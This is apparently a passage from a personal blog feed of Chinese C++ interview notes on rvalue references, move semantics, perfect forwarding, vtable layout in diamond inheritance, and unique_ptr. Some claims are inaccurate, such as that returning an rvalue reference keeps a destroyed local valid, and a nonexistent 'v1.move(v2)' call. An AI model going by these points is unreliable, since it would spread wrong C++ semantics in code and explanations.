    <content type="html"><![CDATA[<p>C++11新特性 仅供面试专用</p><span id="more"></span><h1 id="1-什么是右值引用"><a href="#1-什么是右值引用" class="headerlink" title="1.什么是右值引用"></a>1.什么是右值引用</h1><p>  首先介绍下左右值(我发现自己学了好长时间都没有对两者进行区分~)<br>  对于左值、右值可以简单的以放在等号左右为区分，等号左边的是左值，等号右边的是右值。<br>  再来详细的介绍下各自的特点：<br>    左值：<br>    1）左值可以取地址<br>    2）左值可以修改<br>    3）左值可以放在等号左右两边<br>    右值：<br>    1）右值不可以取地址<br>    2）右值不可以直接修改<br>    3）右值只能放在等号右边<br>    4）右值往往是没有名称的</p><p>  再来举几个实例：<br>  左值举例：int a; int a = 3;<br>  上面的a都是左值</p><p>  关于右值，C++11将右值分了两类：纯右值、将亡值。从例子上看：<br>  1）<strong>纯右值</strong> int a = 3; 就是指等号右边的常数，上式中的3<br>  2）<strong>将亡值</strong>其实就是中间变量的过渡，过渡之后就消亡，可以细分两种<br>   （1）函数的临时返回值 int a = f(3); f(3)的返回值是右值，副本拷贝给a，然后消失<br>   （2）表达式 像(x+y)，其中(x+y)是右值</p><p>  在左右值使用时有三个原则，不能违反原则，否则编译无法通过：<br>  原则1：右值可以赋给左值，左值不能给右值(<strong>左值权限更大</strong>)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> a = <span class="hljs-number">3</span>;  <span class="hljs-comment">// a是左值，3是右值</span><br><span class="hljs-type">int</span> d = a;  <span class="hljs-comment">// d和a都是左值，左值可以赋给左值</span><br><span class="hljs-type">int</span> &amp;&amp;d = a; × <span class="hljs-comment">// 右值引用左值不行</span><br><span class="hljs-type">int</span> &amp;&amp;d = <span class="hljs-number">10</span>;  <span class="hljs-comment">// 右值引用右值可以</span><br><span class="hljs-type">int</span> &amp;&amp;d = <span class="hljs-built_in">f</span>(<span class="hljs-number">10</span>);  <span class="hljs-comment">// 右值引用右值可以</span><br></code></pre></td></tr></table></figure><p>​    原则2：右值无法修改</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> a = <span class="hljs-number">10</span>;  <span class="hljs-comment">// 10是右值常数，无法修改</span><br></code></pre></td></tr></table></figure><p>​    原则3：编译器允许为左值建立引用，不可以为右值建立引用</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> num = <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> &amp;b = num;  √  <span class="hljs-comment">// num是左值，可以左值建立引用</span><br><span class="hljs-type">int</span> &amp;b = <span class="hljs-number">10</span>; ×  <span class="hljs-comment">// 10是右值，不可以右值建立引用</span><br></code></pre></td></tr></table></figure><p> 有一个问题存在：只有左值可以修改，那如果想对右值进行修改怎么办？ 解决办法就是——右值引用</p><p>  <strong>右值引用的语法：&amp;&amp;</strong><br>  使用右值引用需要注意三个问题：<br>  1）右值引用必须要进行初始化</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> &amp;&amp; a;  × <span class="hljs-comment">// 必须初始化</span><br></code></pre></td></tr></table></figure><p>​    2)不能使用左值进行初始化</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">int num = <span class="hljs-number">10</span>;<br>int &amp;&amp; a = num; × <span class="hljs-comment">//不能使用左值进行右值初始化</span><br>int &amp;&amp; a = <span class="hljs-number">10</span>; √ <br></code></pre></td></tr></table></figure><p>​    3)右值引用可以对右值进行修改</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">int &amp;&amp;a = <span class="hljs-number">10</span>;    <span class="hljs-comment">// 这里的a是右值引用，其实是10</span><br>a = <span class="hljs-number">100</span>;<br></code></pre></td></tr></table></figure><p>可以发现当对右值加上应用后可以修改值也可以修改地址，从功能上升为左值。所以有一种说法：右值引用的本质就是不用拷贝的左值。</p><h1 id="2-右值引用的好处？"><a href="#2-右值引用的好处？" class="headerlink" title="2.右值引用的好处？"></a>2.右值引用的好处？</h1><p>  先想想引用的目的，传递参数有两种方式：值传递和引用传递。二者相比引用传递的优势就是通过传递地址，来减少一次拷贝。在常规写程序的时候，使用的都是左值引用。左值引用有两个使用场景：函数传参、函数返回值。<br>  1）函数传参：int f(int &amp;a);<br>  2）函数返回值：int&amp; f();<br>  以上两种情况使用的都是引用传递相比于值传递减少了拷贝次数。但有一种情况会出问题：就是返回值是一个临时对象。如下代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">A&amp; <span class="hljs-title">f</span><span class="hljs-params">()</span> </span>&#123;<br>A a;<br><span class="hljs-keyword">return</span> a;<br>&#125;<br></code></pre></td></tr></table></figure><p>  当返回对象a的地址时，其实a作为在栈上的临时对象，作用域已经到了，被析构。这样如果外界再对这个地址进行访问时，就会出现问题。这也左值引用的一个弊端，而右值引用的出现就是为了解决这个问题。那右值引用是怎么解决返回的临时变量析构？ 当返回值为右值引用时，<strong>会把返回的临时变量中的内存居为己用</strong>，仍保持了有效性，也避免了拷贝。</p><h1 id="3-右值引用的应用"><a href="#3-右值引用的应用" class="headerlink" title="3.右值引用的应用"></a>3.右值引用的应用</h1><p>  右值引用的应用场景场景主要有两个：移动语义、完美转发。下面分别介绍一下：<br>  移动语义<br>  如果我们把赋值这类操作看作资源转移，那么传统的资源转让是通过拷贝实现的，需要两份空间。而移动语义是通过移动来实现资源转让，只使用一个空间。来看一下移动语义的实现原理：<br>  首先明确移动语义和右值引用的关系：实现移动语义，就必须使用右值引用。移动语义具体实现是基于移动构造和移动赋值，而移动构造函数和移动赋值函数都需要形参为右值引用类型。<br>  移动构造和移动赋值负责在不发生拷贝的情况下将资源转移到目标对象名下，<br>  ps：这里的构造和赋值一般指对象初始化的两种方式：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 移动构造</span><br><span class="hljs-function">Obj <span class="hljs-title">a</span><span class="hljs-params">(b)</span></span>;<br><br><span class="hljs-comment">// 移动赋值</span><br>Obj a = b;<br></code></pre></td></tr></table></figure><p>  移动语义避免了拷贝的风险，拷贝有两方面，一方面避免了浅拷贝可能引发的悬空指针的问题，另一方面也避免了深拷贝昂贵的开销</p><p>  移动语义避免了拷贝的风险，拷贝有两方面，一方面避免了浅拷贝可能引发的悬空指针的问题，另一方面也避免了深拷贝昂贵的开销</p><p>  前面说移动语义只能用右值引用实现，那有的时候就是希望用左值怎么办呢？这里有一个move函数，作用是把左值强制转换成右值引用，然后就能继续使用右值引用的特性。一般move用于对象，因为只有对象才会有各种构造函数，对于基本类型就无效啦。</p><p>完美转发<br>  存在这样一种情况：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">notPerfectForward</span><span class="hljs-params">(<span class="hljs-type">int</span> &amp;&amp;i)</span> </span>&#123;<br><span class="hljs-built_in">printValue</span>(i)；  i会被当作左值处理<br>&#125;<br></code></pre></td></tr></table></figure><p>  这个转发过程中，i最开始是右值引用，但再次传递时却变成了左值。失去了右值引用的特性，不是我们的预期。这种情况适合使用完美转发。<br>  完美转发指函数模板可以将自己的参数完美地转发给内部调用的其他函数。完美指不仅能准确转发参数的值，还能保证转发参数的左右值属性不变。简单点说也就是如果参数是左值引用，转发给下一个函数还是左值引用；如果参数是右值引用，则转发给下一个函数还是右值引用。<br>  完美转发的实现基于，std::forward，像下面这样：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PerfectForward</span><span class="hljs-params">(T &amp;&amp;i)</span> </span>&#123;<br><span class="hljs-built_in">printValue</span>(std::forward&lt;T&gt;(i))； 这个i会被当作右值处理<br>&#125;<br></code></pre></td></tr></table></figure><p>  右值引用提供了很好的特性，这篇文章只是简单的对右值引用一些常见的概念做了解释，但想要具体使用还远远不够，只有在项目中多多使用，才能融会贯通，加油哇~</p>]]></content>
    
    
    <categories>
      
      <category>C++</category>
      
      <category>面试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>探讨多态的原理 - 菱形虚拟继承</title>
    <link href="/project/2023/03/19/%E8%8F%B1%E5%BD%A2%E8%99%9A%E6%8B%9F%E7%BB%A7%E6%89%BF/"/>
    <url>/project/2023/03/19/%E8%8F%B1%E5%BD%A2%E8%99%9A%E6%8B%9F%E7%BB%A7%E6%89%BF/</url>
    
    <content type="html"><![CDATA[<p> 探索多态模型—菱形继承和菱形虚拟继承</p><span id="more"></span><h1 id="类AA被类BB和类CC重复继承："><a href="#类AA被类BB和类CC重复继承：" class="headerlink" title="类AA被类BB和类CC重复继承："></a>类AA被类BB和类CC重复继承：</h1><p>如下图：</p><p><img src="/project/dimond_images/%E8%99%9A%E6%8B%9F%E7%BB%A7%E6%89%BF.png" alt="重复继承"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AA</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">a</span><span class="hljs-params">()</span></span>&#123; cout &lt;&lt; <span class="hljs-string">&quot;AA::a()&quot;</span> &lt;&lt; endl; &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">a1</span><span class="hljs-params">()</span></span>&#123; cout &lt;&lt; <span class="hljs-string">&quot;AA::a1()&quot;</span> &lt;&lt; endl; &#125;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> _a;<br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BB</span> : <span class="hljs-keyword">public</span> AA<br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">a</span><span class="hljs-params">()</span></span>&#123; cout &lt;&lt; <span class="hljs-string">&quot;BB::a()&quot;</span> &lt;&lt; endl; &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">a2</span><span class="hljs-params">()</span></span>&#123; cout &lt;&lt; <span class="hljs-string">&quot;BB::a2()&quot;</span> &lt;&lt; endl; &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">a3</span><span class="hljs-params">()</span></span>&#123; cout &lt;&lt; <span class="hljs-string">&quot;BB::a3()&quot;</span> &lt;&lt; endl; &#125;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> _b;<br><br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CC</span> : <span class="hljs-keyword">public</span> AA<br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">a</span><span class="hljs-params">()</span></span>&#123; cout &lt;&lt; <span class="hljs-string">&quot;CC::a()&quot;</span> &lt;&lt; endl; &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">a1</span><span class="hljs-params">()</span></span>&#123; cout &lt;&lt; <span class="hljs-string">&quot;CC::a1()&quot;</span> &lt;&lt; endl; &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">a4</span><span class="hljs-params">()</span></span>&#123; cout &lt;&lt; <span class="hljs-string">&quot;CC::a4()&quot;</span> &lt;&lt; endl; &#125;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> _c;<br><br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DD</span> : <span class="hljs-keyword">public</span> BB , <span class="hljs-keyword">public</span> CC<br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">a</span><span class="hljs-params">()</span></span>&#123; cout &lt;&lt; <span class="hljs-string">&quot;DD::a()&quot;</span> &lt;&lt; endl; &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">a2</span><span class="hljs-params">()</span></span>&#123; cout &lt;&lt; <span class="hljs-string">&quot;DD::a2()&quot;</span> &lt;&lt; endl; &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">a3</span><span class="hljs-params">()</span></span>&#123; cout &lt;&lt; <span class="hljs-string">&quot;DD::a3()&quot;</span> &lt;&lt; endl; &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">a5</span><span class="hljs-params">()</span></span>&#123; cout &lt;&lt; <span class="hljs-string">&quot;DD::a5()&quot;</span> &lt;&lt; endl; &#125;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> _d;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span><span class="hljs-params">(*FUNC)</span> <span class="hljs-params">()</span></span>;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Print</span><span class="hljs-params">(<span class="hljs-type">int</span> *Vfptr)</span></span><br><span class="hljs-function"></span>&#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;虚表地址&quot;</span> &lt;&lt; Vfptr &lt;&lt; endl;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; Vfptr[i] != <span class="hljs-number">0</span>; ++i)<br>    &#123;<br>        FUNC f = (FUNC)Vfptr[i];<br>        cout &lt;&lt; <span class="hljs-string">&quot;[&quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot;]&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-built_in">f</span>();<br>    &#125;<br>    cout &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    DD d;<br>    <span class="hljs-type">int</span> *Vfptr1 = (<span class="hljs-type">int</span>*)(*(<span class="hljs-type">int</span>*)&amp;d);<br>    <span class="hljs-type">int</span> *Vfptr2 = (<span class="hljs-type">int</span>*)(*((<span class="hljs-type">int</span>*)&amp;d+<span class="hljs-built_in">sizeof</span>(BB)/<span class="hljs-number">4</span>));<br>    <span class="hljs-built_in">Print</span>(Vfptr1);<br>    <span class="hljs-built_in">Print</span>(Vfptr2);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>虚表的结果：</p><p><img src="/project/dimond_images/%E8%99%9A%E8%A1%A8%E7%9A%84%E7%BB%93%E6%9E%9C.png" alt="虚表的结果"></p><p>菱形继承总结：</p><blockquote><p>会出现数据冗余和二义性问题<br>派生类会分别继承每个基类的虚函数表，并将自己的虚函数放在第一个虚函数表中<br>成员变量的顺序按照继承的关系排列</p></blockquote><p>菱形虚拟继承</p><p>虚继承就是在类BB和类CC继承的时候加上virtual关键字</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AA</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">a</span><span class="hljs-params">()</span></span>&#123; cout &lt;&lt; <span class="hljs-string">&quot;AA::a()&quot;</span> &lt;&lt; endl; &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">a1</span><span class="hljs-params">()</span></span>&#123; cout &lt;&lt; <span class="hljs-string">&quot;AA::a1()&quot;</span> &lt;&lt; endl; &#125;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> _a;<br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BB</span> : <span class="hljs-keyword">virtual</span> <span class="hljs-keyword">public</span> AA<br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">a</span><span class="hljs-params">()</span></span>&#123; cout &lt;&lt; <span class="hljs-string">&quot;BB::a()&quot;</span> &lt;&lt; endl; &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">a2</span><span class="hljs-params">()</span></span>&#123; cout &lt;&lt; <span class="hljs-string">&quot;BB::a2()&quot;</span> &lt;&lt; endl; &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">a3</span><span class="hljs-params">()</span></span>&#123; cout &lt;&lt; <span class="hljs-string">&quot;BB::a3()&quot;</span> &lt;&lt; endl; &#125;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> _b;<br><br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CC</span> : <span class="hljs-keyword">virtual</span> <span class="hljs-keyword">public</span> AA<br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">a</span><span class="hljs-params">()</span></span>&#123; cout &lt;&lt; <span class="hljs-string">&quot;CC::a()&quot;</span> &lt;&lt; endl; &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">a1</span><span class="hljs-params">()</span></span>&#123; cout &lt;&lt; <span class="hljs-string">&quot;CC::a1()&quot;</span> &lt;&lt; endl; &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">a4</span><span class="hljs-params">()</span></span>&#123; cout &lt;&lt; <span class="hljs-string">&quot;CC::a4()&quot;</span> &lt;&lt; endl; &#125;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> _c;<br><br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DD</span> : <span class="hljs-keyword">public</span> BB , <span class="hljs-keyword">public</span> CC<br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">a</span><span class="hljs-params">()</span></span>&#123; cout &lt;&lt; <span class="hljs-string">&quot;DD::a()&quot;</span> &lt;&lt; endl; &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">a2</span><span class="hljs-params">()</span></span>&#123; cout &lt;&lt; <span class="hljs-string">&quot;DD::a2()&quot;</span> &lt;&lt; endl; &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">a3</span><span class="hljs-params">()</span></span>&#123; cout &lt;&lt; <span class="hljs-string">&quot;DD::a3()&quot;</span> &lt;&lt; endl; &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">a5</span><span class="hljs-params">()</span></span>&#123; cout &lt;&lt; <span class="hljs-string">&quot;DD::a5()&quot;</span> &lt;&lt; endl; &#125;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> _d;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span><span class="hljs-params">(*FUNC)</span> <span class="hljs-params">()</span></span>;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Print</span><span class="hljs-params">(<span class="hljs-type">int</span> *Vfptr)</span></span><br><span class="hljs-function"></span>&#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;虚表地址&quot;</span> &lt;&lt; Vfptr &lt;&lt; endl;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; Vfptr[i] != <span class="hljs-number">0</span>; ++i)<br>    &#123;<br>        FUNC f = (FUNC)Vfptr[i];<br>        cout &lt;&lt; <span class="hljs-string">&quot;[&quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot;]&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-built_in">f</span>();<br>    &#125;<br>    cout &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    DD d;<br>    <span class="hljs-type">int</span> *Vfptr1 = (<span class="hljs-type">int</span>*)(*(<span class="hljs-type">int</span>*)&amp;d);<br>    <span class="hljs-type">int</span> *Vfptr2 = (<span class="hljs-type">int</span>*)(*(<span class="hljs-type">int</span>*)((<span class="hljs-type">char</span>*)&amp;d+<span class="hljs-built_in">sizeof</span>(DD)-<span class="hljs-built_in">sizeof</span>(AA)));<br>    <span class="hljs-type">int</span> *Vfptr3 = (<span class="hljs-type">int</span>*)(*((<span class="hljs-type">int</span>*)((<span class="hljs-type">char</span>*)&amp;d + <span class="hljs-built_in">sizeof</span>(BB)-<span class="hljs-built_in">sizeof</span>(AA))));<br><br>    <span class="hljs-built_in">Print</span>(Vfptr1);<br>    <span class="hljs-built_in">Print</span>(Vfptr2);<br>    <span class="hljs-built_in">Print</span>(Vfptr3);<br><br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/project/dimond_images/%E8%8F%B1%E5%BD%A2%E8%99%9A%E6%8B%9F%E7%BB%A7%E6%89%BF.png" alt="菱形虚拟继承"></p>]]></content>
    
    
    <categories>
      
      <category>C++</category>
      
      <category>面试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>智能指针</title>
    <link href="/project/2023/03/17/%E6%99%BA%E8%83%BD%E6%8C%87%E9%92%88/"/>
    <url>/project/2023/03/17/%E6%99%BA%E8%83%BD%E6%8C%87%E9%92%88/</url>
    
    <content type="html"><![CDATA[<p>针对于C++面试题，博主复习，C++11新标准的智能指针</p><span id="more"></span><h1 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h1><p>所谓的智能指针本质就是一个类模板，它可以创建任意的类型的指针对象，当智能指针对象使用完后，对象就会自动调用析构函数去释放该指针所指向的空间。</p><p>所有的智能指针类模板中都需要包含一个指针对象，构造函数和析构函数</p><h1 id="2-三大智能指针"><a href="#2-三大智能指针" class="headerlink" title="2.三大智能指针"></a>2.三大智能指针</h1><h2 id="1-unique-ptr"><a href="#1-unique-ptr" class="headerlink" title="(1)unique_ptr"></a>(1)unique_ptr</h2><p>C++11版本库提供的智能指针，直接将拷贝构造函数和赋值重载函数给禁用掉，因此不让其进行拷贝和赋值。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">unique_ptr&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">v1</span><span class="hljs-params">(<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>(<span class="hljs-number">0</span>))</span></span>;<br><span class="hljs-function">unique_ptr&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">v2</span><span class="hljs-params">(v1)</span></span>; <span class="hljs-comment">//Error 不能拷贝</span><br>v2 = v1; <span class="hljs-comment">//Error 不能赋值重载</span><br></code></pre></td></tr></table></figure><p>我们通过内存查看&amp;v1,如下图：</p><p><img src="/project/smart_pointer_images/unique_&v1%E5%A0%86%E5%8C%BA%E5%86%85%E5%AD%98.png" alt="&amp;v1"></p><p>我们找到了堆区内存地址，我们在内存中查看该地址，如下图：</p><p><img src="/project/smart_pointer_images/unique_v1%E5%A0%86%E5%8C%BA%E5%86%85%E5%AD%98.png" alt="堆区内存"></p><p>地址中即为存储的0</p><p>unique_ptr它所指向的资源对象，该资源对象不会被多个unique_ptr对象同时占有，可以称之为独占指针</p><p>此外unique_ptr还有以下特性：</p><p>1)虽然unique_ptr对象之间不能进行拷贝和赋值，但是可以进行移动，如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//1.通过reset()</span><br>v1.<span class="hljs-built_in">reset</span>(v2.<span class="hljs-built_in">release</span>()); <span class="hljs-comment">//v2.release() 将NULL赋值到指针对象中，并返回原先指针对象关联的资源对象的裸指针</span><br><span class="hljs-comment">//2.通过move</span><br>v1.<span class="hljs-built_in">move</span>(v2);<span class="hljs-comment">//令v2为NULL，将v2的原始指针传给v1</span><br></code></pre></td></tr></table></figure><p>Tips: get()和release()的区别： </p><ul><li><p>get()是返回一个裸指针但原始指针不变，unique_ptr可以和普通指针共同管理一个对象，并且普通对象的操作可以反映到unique_ptr指针所指向的对象上</p><p> 